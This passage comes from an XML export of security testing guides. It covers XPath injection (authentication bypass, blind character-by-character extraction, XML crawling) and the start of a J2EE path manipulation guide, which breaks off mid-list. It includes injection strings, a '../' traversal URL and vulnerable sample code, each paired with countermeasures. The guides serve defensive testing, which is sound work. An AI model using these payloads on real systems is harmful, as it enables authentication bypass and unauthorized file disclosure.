&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;account&amp;gt;Mr. T&amp;lt;/account&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/user&amp;gt; &lt;br&gt;&amp;lt;/users&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;An XPath query consists of expressions containing backslashes (/) and dots (.) that are used to select nodes from the root node down and predicates enclosed in squared brackets ([]) used to include
&lt;em&gt;when&lt;/em&gt; conditions:&lt;/p&gt;
&lt;pre&gt;/users/user/username&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;/users/user[username/text() ='johns'] &lt;/pre&gt;
&lt;p&gt;The first query returns all username nodes while the second uses a predicate to search all usernames that match the string
&lt;em&gt;johns&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A common scenario is to use XPath to perform authentication.&amp;nbsp; For example, the next query grabs a username and password from a web form and check if they match the ones of a valid user [i]:&lt;/p&gt;
&lt;pre&gt;//users/user[username/text()='&amp;quot; &amp;#43; Request.QueryString(&amp;quot;username&amp;quot;) &amp;#43; &amp;quot;' and password/text()='&amp;quot; &amp;#43; Request.QueryString(&amp;quot;password&amp;quot;) &amp;#43; &amp;quot;']&amp;quot;;&lt;/pre&gt;
&lt;p&gt;If a user enters safe values (username=test, password=123) the application builds a standard authentication query:&lt;/p&gt;
&lt;pre&gt;//users/user[username/text()='test' and password/text()='123']&lt;/pre&gt;
&lt;p&gt;However an attacker can use the web form to submit the following injection string as the username and 123 as the password:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;user' or '1' = '1&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;The resulting XPath query looks like this:&lt;/p&gt;
&lt;pre&gt;/users/user[username/text()='&lt;strong&gt;user' or '1' = '1'&lt;/strong&gt; and password/text()='123']&lt;/pre&gt;
&lt;p&gt;Unlike SQL, XPath disallows commenting the rest of the expression so the attacker needs to insert an
&lt;em&gt;or&lt;/em&gt; condition that makes the password check irrelevant.&amp;nbsp; The modified query returns all the users and the result is an attack against the authentication scheme in use.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 2: Blind XPath Injection &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Similar to blind SQL Injection, blind XPath Injection uses true and false conditions to infer confidential information.&amp;nbsp; For example, an attacker wants to retrieve another user’s password but has no way of forcing the web application to display it on screen.&amp;nbsp;
 The attacker uses blind XPath injection to steal the victim passwords character by character.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;In the example below, the attacker now logs in with a valid account (johns) and tries to steal the password of another user.&amp;nbsp;&amp;nbsp; The attacker passes this attack string to check if the password for the third user in the document tree (&amp;quot;mrt&amp;quot;) starts with an
 &amp;quot;a&amp;quot; [ii]:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;johns' and substring((//user[position()=3]/child::node()[position()=2]),1,1)=&amp;quot;a&amp;quot; and '1' = '1&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;The resulting XPath query looks the one below (note that the attacker needs to pass his valid username and password). The statement only returns true if the substring() condition is true:&amp;nbsp;
&lt;/p&gt;
&lt;pre&gt;/users/user[username/text()='&lt;strong&gt;johns' and substring((//user[position()=3]/child::node()[position()=2]),1,1)=&amp;quot;a&amp;quot; and '1' = '1&lt;/strong&gt;' and password/text()='abc123']&lt;/pre&gt;
&lt;p&gt;The attacker can craft similar blind commands to check data lengths using string-length().&amp;nbsp; For instance, the next query returns true if the length of the target password is 7:&lt;/p&gt;
&lt;pre&gt;/users/user[username/text()='&lt;strong&gt;johns' and string-length(//user[position()=3]/child::node()[position()=2]) and '1' = '1&lt;/strong&gt;' and password/text()='abc123']&lt;/pre&gt;
&lt;p&gt;The attacker can use additional functions such as count(), contains() to reveal both the contents of an XML store as well as its structure.&amp;nbsp; Exploring the logic and hierarchy of an XML document is known as
&lt;em&gt;XML Crawling&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;The following step in testing for XPath Injection bugs is to understand what causes them and how to defend against them.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;XPath Injection Cause&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;XPath Injection bugs exist due to poor input validation on and failing to sanitize the parameters used in an XPath query.&amp;nbsp; For example, consider the following PHP code:&lt;/p&gt;
&lt;pre&gt;&amp;lt;?php&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $xml = simplexml_load_file(&amp;quot;users.xml&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $result = $xml-&amp;gt;xpath(&amp;quot;//users/user[username/text()='&amp;quot;&lt;strong&gt;. $_GET['name'] &lt;/strong&gt;. &amp;quot;']&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; print_r($result);&lt;br&gt;?&amp;gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;The PHP application uses the value passed in the URL parameter name in the XPath query without checking for injected commands.&lt;/p&gt;
&lt;p&gt;Make sure to look at the API functions that your application uses to execute XPath queries.&amp;nbsp;&amp;nbsp; This table shows some common XPath APIs:&amp;nbsp;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;&lt;strong&gt;Class/API&lt;/strong&gt;&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;XPath.compile() &lt;/pre&gt;
&lt;pre&gt;XPathExpression.evaluate()&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;XPathNavigator.Select()&lt;/pre&gt;
&lt;p&gt;XPathNavigator.Evaluate()&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;ASP .NET&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;xpath()&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;PHP&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;findvalue()&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Perl&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;XPath Injection Countermeasures&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;XPath Injection vulnerabilities can be prevented by sanitizing user input.&amp;nbsp; Specifically, the application needs to disallow any single or double quotes inputted by a user from making it to an XPath query.&amp;nbsp;&amp;nbsp; Sometimes the input doesn’t come directly from
 the user but is read from a persistent data source such as a database or an environment variable.&amp;nbsp;&amp;nbsp; In these cases, the application must sanitize the data coming from the data source and into the XPath query.&lt;/p&gt;
&lt;p&gt;A proposed method [iii] consists of escaping any single quotes (VB):&lt;/p&gt;
&lt;pre&gt;Dim FindUserXPath as String&lt;br&gt;FindUserXPath = &amp;quot;//Employee[UserName/text()='&amp;quot; &amp;amp;&lt;br&gt;Request(&amp;quot;Username&amp;quot;).Replace(&amp;quot;'&amp;quot;, &amp;quot;&amp;amp;apos;&amp;quot;) &amp;amp; &amp;quot;' And&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Password/text()='&amp;quot; &amp;amp; Request(&amp;quot;Password&amp;quot;).Replace(&amp;quot;'&amp;quot;, &amp;quot;&amp;amp;apos;&amp;quot;) &amp;amp; &amp;quot;']&amp;quot;&lt;br&gt;&lt;/pre&gt;
&lt;p&gt;Other methods include using parameterized XPath queries to properly handle user input.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you are familiar with the inner workings of XPath injection attacks and able to recognize both its causes and countermeasures, &amp;nbsp;you must continue by executing basic XPath Injection black box test cases and exploring the results.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Start with a simple test string&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Almost all XPath Injection strings must contain either a single or a double quote.&amp;nbsp; Your first test pass must consist of submitting a string containing quotes to see how the application reacts to it:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;abc'xyz&amp;quot;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;If the server doesn’t return an error message and uses this string for an XPath query, it is almost certain that you’ll find an XPath Injection bug.&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Testing for Normal XPath Injection Authentication Bypass &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Hardware Requirements:&amp;nbsp; One client computer and one server computer running the web application.&lt;/p&gt;
&lt;p&gt;Tools:&amp;nbsp;&amp;nbsp; Web browser.&lt;/p&gt;
&lt;p&gt;Testing steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;In the client computer, open the web browser and navigate to an authentication page in the server that uses XPath.
&lt;/li&gt;&lt;li&gt;Enter a string (first for the username and then for the password) containing and additional true command.
&lt;/li&gt;&lt;li&gt;Submit the authentication form to the server.&lt;/li&gt;&lt;/ol&gt;
&lt;br&gt;
&lt;p&gt;Expected results:&amp;nbsp; The application should not authenticate the client.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Testing for Normal XPath Injection Information Disclosure&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Hardware Requirements:&amp;nbsp; One client computer and one server computer running the web application.&lt;/p&gt;
&lt;p&gt;Tools:&amp;nbsp;&amp;nbsp; Web browser.&lt;/p&gt;
&lt;p&gt;Testing steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;In the client computer, open the web browser and navigate to any web form or other entry point that the server uses to build an XPath query.
&lt;/li&gt;&lt;li&gt;Enter a string containing an additional command that executes an XPath query on another user’s node.
&lt;/li&gt;&lt;li&gt;Submit the form to the server.&lt;/li&gt;&lt;/ol&gt;
&lt;br&gt;
&lt;p&gt;Expected results:&amp;nbsp; The application should not send a response containing data from the other user’s XML node.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Testing for Blind XPath Injection Information Disclosure&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Hardware Requirements:&amp;nbsp; One client box computer one server computer running the web application.&lt;/p&gt;
&lt;p&gt;Tools:&amp;nbsp;&amp;nbsp; Web browser.&lt;/p&gt;
&lt;p&gt;Testing steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;In the client computer, open the web browser and navigate to any web form or other entry point that the server uses to build an XPath query.
&lt;/li&gt;&lt;li&gt;Enter a string containing an additional command that gathers partial knowledge of confidential information in the XML store.
&lt;/li&gt;&lt;li&gt;Submit the form to the server. &lt;/li&gt;&lt;li&gt;Repeat steps 2 and 3 until the desired information is fully disclosed.&lt;/li&gt;&lt;/ol&gt;
&lt;br&gt;
&lt;p&gt;Expected results:&amp;nbsp; The application should not disclose the desired information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Fine-tune Test Case Data&lt;/h1&gt;
&lt;p&gt;Finally, to achieve proper test case coverage, you must submit tests cases through different application entry points and adapt the format of the test data depending on the data format required for each entry point and each type of attack that can be carried
 out.&amp;nbsp;&amp;nbsp; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Tune test case data format according to entry points&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Like when testing for any injection bug, it is important that you adapt the data used in test cases according to the entry point under test.&amp;nbsp; For example, when testing through URL parameters, the first string might look like the second or the third depending
 on the URL-encoding schema:&lt;/p&gt;
&lt;pre&gt;user' or '1' = '1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; original test string&lt;/pre&gt;
&lt;pre&gt;user'&amp;#43;or&amp;#43;'1'&amp;#43;=&amp;#43;'1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; string under URL encoding schema 1&lt;/pre&gt;
&lt;pre&gt;user'%20or%20'1'%20=%20'1&amp;nbsp;&amp;nbsp;&amp;nbsp; string under URL encoding schema 2&lt;/pre&gt;
&lt;p&gt;You must consider tuning the test case format for different entry points below such as URL parameters, web form fields, web services methods, flash parameters, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Fine-tune test case data according to different attack objectives&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Finally, you must consider the different variations and constructs depending on the attack objective that the test case executed.&amp;nbsp;&amp;nbsp; The table below shows test case constructs depending on the objective.&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Construct&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Attack Objective&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;br&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; a' or '1=1'&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; a&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; a'] or '1'='1&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; a&amp;quot;] or &amp;quot;1&amp;quot;=&amp;quot;1&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ' or 1=1 or ''='&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Authentication bypass&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (string-length(S))&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (substring(S,N,1))&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; count(//user/child::node())&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Blind XPath injection&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; namespace-uri(path)&lt;a href="about:blank#_edn4" name="x__ednref4"&gt;[iv]&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; name(path)&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; count(path/child::node())&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; count(path/child::text())&lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; count(path/child::comment()) &lt;/p&gt;
&lt;p&gt;•&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; count(path/child::*) count(path/child::processing-instruction()) &lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;XML Crawling&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;XPath Injection is a vulnerability that allows bypassing authentication and accessing an entire XML document.&amp;nbsp; It is caused because the vulnerable application fails to properly validate and sanitize user input and uses the input as part of an XPath query.&amp;nbsp;&amp;nbsp;
 There are different test cases to execute depending on the type of XPath Injection under test: normal or simple XPath Injection, blind XPath Injection, and XML crawling.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;div&gt;&lt;br&gt;
&lt;hr&gt;
&lt;div&gt;
&lt;p&gt;[i] &lt;strong&gt;OWASP - XPath Injection Overview&lt;/strong&gt;. Roberto Suggi Liverani.
&lt;a href="http://www.owasp.org/index.php/XPATH_Injection"&gt;http://www.owasp.org/index.php/XPATH_Injection&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;[ii] &lt;strong&gt;OWASP - Blind XPath Injection.&lt;/strong&gt; &lt;a href="http://www.owasp.org/index.php/Blind_XPath_Injection"&gt;
http://www.owasp.org/index.php/Blind_XPath_Injection&lt;/a&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;[iii]&amp;nbsp; &lt;strong&gt;OWASP -XPath Injection.&lt;/strong&gt; &lt;a href="http://www.owasp.org/index.php/XPath_Injection"&gt;
http://www.owasp.org/index.php/XPath_Injection&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;[iv]&amp;nbsp; &lt;strong&gt;Blind&lt;/strong&gt; &lt;strong&gt;XPath&lt;/strong&gt; &lt;strong&gt;Injection&lt;/strong&gt;. Amit Klein.
&lt;a href="http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf"&gt;http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>737c7f96-0f85-4f97-94e3-cb473008d721</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Path Manipulation Bugs in Java</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;J2EE applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;In a path manipulation attack, an attacker submits input to alter an internal file path used by the application, forcing the application to use a malicious path. Attackers may exploit this bug to read sensitive files on the server, such as configuration
 files or another user’s files, or to modify or delete server-side files. &lt;/p&gt;
&lt;p&gt;Follow these steps to test for path manipulation bugs in J2EE:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1: Understand attack scenarios &lt;/li&gt;&lt;li&gt;Step 2: Analyze causes and countermeasures &lt;/li&gt;&lt;li&gt;Step 3: Start testing and exploring &lt;/li&gt;&lt;li&gt;Step 4: Execute additional testing&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1: Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;The first step in testing for path manipulation bugs is to understand the anatomy of an attack scenario.
&lt;/p&gt;
&lt;p&gt;To exploit this vulnerability, the attacker manipulates a file path in an HTTP request. If the application is vulnerable, it uses the manipulated file path to perform a file system operation.&lt;/p&gt;
&lt;p&gt;The attack starts with the attacker discovering an HTTP request that invokes a server-side file system operation such as reading, modifying, deleting, emailing, or printing a file. This request comes either from a Web page or from a client-side script (such
 as in AJAX applications) and contains a variable (URL parameter, Web form input, etc) that the server uses to determine what file to handle.&lt;/p&gt;
&lt;p&gt;To execute the attack, the attacker submits the request but modifies this variable in an attempt to manipulate a server-side file. If the attack is successful, the value provided by the attacker causes the server to access a file in a different path. In
 most cases, the attacker will be able to tell if the attack is successful shortly after executing it.&lt;/p&gt;
&lt;p&gt;The steps are then:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The attacker finds an HTTP request that invokes a file system operation at the server.
&lt;/li&gt;&lt;li&gt;The attacker locates a variable in&amp;nbsp;that HTTP request that is used to determine the path for a file system operation.
&lt;/li&gt;&lt;li&gt;The attacker submits the request but modifies the path-determining variable and waits for a server response.
&lt;/li&gt;&lt;li&gt;The attacker verifies if the attack is successful by observing the server’s response.
&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;&lt;em&gt;&lt;br&gt;
Attack Variants&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Attackers can employ path manipulation attacks to achieve different threats. For example, an attacker can manipulate a path to read server configuration and password files or to read files belonging to another user in order to &amp;nbsp;execute an information disclosure
 attack on the application. Similarly, an attacker can manipulate a path to force the J2EE application to delete a file needed to properly service its users, thus generating a denial of service situation.&lt;/p&gt;
&lt;h1&gt;Step 2: Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;Before executing practical test cases, it is necessary to understand why these bugs exist and how to avoid them.&lt;/p&gt;
&lt;p&gt;Path manipulation bugs are caused by J2EE applications that use client-supplied input to build a file path without properly validating the input. For instance, the code below gets an input value from the user in a URL parameter named
&lt;em&gt;filename&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;PrintWriter out = response.getWriter();&lt;br&gt;&amp;nbsp;&lt;br&gt;String filename = &amp;quot;/public/user_files/&amp;quot; &amp;#43; request.getParameter(&amp;quot;filename&amp;quot;).toString();&lt;br&gt;&amp;nbsp;&lt;br&gt;File file = new File(filename);&lt;br&gt;FileReader fr = new FileReader(file);&lt;br&gt;BufferedReader br = new BufferedReader(fr);&lt;br&gt;String line = br.readLine();&lt;br&gt;while ( line != null )&lt;br&gt;{&lt;br&gt;  out.println(line);&lt;br&gt;&amp;nbsp;&amp;nbsp;   line = br.readLine();&lt;br&gt;}&lt;br&gt;fr.close();&lt;br&gt;out.close();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;br&gt;
&lt;p&gt;If the user provides an expected file name such as &lt;em&gt;file.txt&lt;/em&gt;, the application returns an expected user file:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;http://example.com.pe/example/getFile?filename=&lt;strong&gt;file.txt&lt;/strong&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;However, in a path manipulation scenario, an attacker provides a malicious value for the variable, hoping that the application uses it to determine a different file path:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;http://example.com.pe/example/getFile?filename=&lt;strong&gt;../../private/secret.txt&lt;/strong&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The string above causes the application to go up two directories, navigate to the
&lt;em&gt;private&lt;/em&gt; folder, and display &lt;em&gt;secret.txt.&lt;/em&gt; The example above is a common scenario in information disclosure due to path manipulation. Notice that the attack is possible because the code shown trusts the filename provided by the client; it starts
 by directly copying the input to the internal variable used to determine the filename without properly validating it.&lt;/p&gt;
&lt;p&gt;To protect against this bug, J2EE applications must properly validate user input. Specifically, they must check if the input is safe to use in determining a file path. Developers can use blacklists that contain a list of all disallowed filename constructs
 such as &lt;strong&gt;../&lt;/strong&gt; and check if the user input appears in the blacklist. The problem with blacklists is that blacklists must account for 100% of attack variants to be effective. Any variant of an attack that is not accounted for will execute unnoticed.&lt;/p&gt;
&lt;p&gt;As such, the recommended approach for defending against this bug is to use &lt;em&gt;
whitelists. &lt;/em&gt;Whitelists specify only safe constructs, and disallow any user input that doesn’t match any of the specified safe constructs. By doing this, they only need to specify what is good and don’t have to worry about accounting 100% of all attack
 variants. A common way of implementing a whitelist is by using a regular expression to specify what is safe and to disallow all input that doesn’t match the regular expression:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String input = request.getParameter(&amp;quot;filename&amp;quot;).toString();&lt;br&gt;&amp;nbsp;&amp;nbsp; &lt;br&gt;String safeConstruct = &amp;quot;^[a-zA-Z]{4,8}\.txt$&amp;quot;;&lt;br&gt;Pattern regexPattern = Pattern.compile(safeConstruct);&lt;br&gt;Matcher regexMatcher = regexPattern.matcher(input);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;if (!regexMatcher.find())&lt;br&gt;{&lt;br&gt;  out.println(&amp;quot;invalid input&amp;quot;);&lt;br&gt;}&lt;br&gt;else&amp;nbsp; &lt;br&gt;{&lt;br&gt;  String filename = &amp;quot;/public/user_files/&amp;quot; &amp;#43; input; &lt;br&gt;&amp;nbsp;  File file = new File(filename);&lt;br&gt;  &amp;nbsp;&lt;br&gt;  /* continue reading file */&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;The input must consist of four to eight consecutive upper- or lower-case letters followed by the extension
&lt;strong&gt;.txt&lt;/strong&gt;. Any input that doesn’t match this form results in the application giving an
&lt;em&gt;invalid input&lt;/em&gt; error.&lt;/p&gt;
&lt;h1&gt;Step 3: Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you’ve learned the common attack scenarios as well as the causes and countermeasures for path manipulation bugs, it is necessary to execute basic test cases to check if your application is vulnerable.&lt;/p&gt;
&lt;p&gt;Success in testing for path manipulation bugs depends on your ability to determine what variables the application uses to build a file path. Applications commonly use URL and Web form variables, so it is necessary to understand how to test through these
 two input points. &lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for path manipulation in URL variables&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps to test for path manipulation in an URL variable:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use an Internet browser to perform a file system operation. Note the URL used, such as:
&lt;em&gt;http://example.com.pe/example.jsp?&lt;strong&gt;page=index.html&lt;/strong&gt;&lt;/em&gt;. &lt;/li&gt;&lt;li&gt;Locate the URL variable used to by the application to determine the file name (in this case it is
